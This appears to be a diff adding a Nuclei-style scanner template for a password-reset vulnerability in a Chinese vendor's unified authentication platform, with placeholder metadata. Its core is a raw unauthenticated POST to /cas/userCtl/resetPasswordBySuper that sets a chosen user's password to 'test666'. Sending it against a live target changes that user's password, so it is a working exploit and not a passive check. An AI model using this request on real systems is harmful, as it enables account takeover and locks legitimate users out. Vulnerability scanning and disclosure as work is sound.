@@ -1,0 +1,27 @@
+id: fskj-user-reset
+info:
+  name: Template Name
+  author: apple
+  severity: high
+  description: 河南省风速科技统一认证平台存在密码重置漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /cas/userCtl/resetPasswordBySuper HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Content-Type: application/json;charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 45
+        Connection: close
+
+        {"xgh":"test","newPass":"test666","email":""}
+    matchers:
+      - type: word
+        part: header
+        words:
+          - '200'
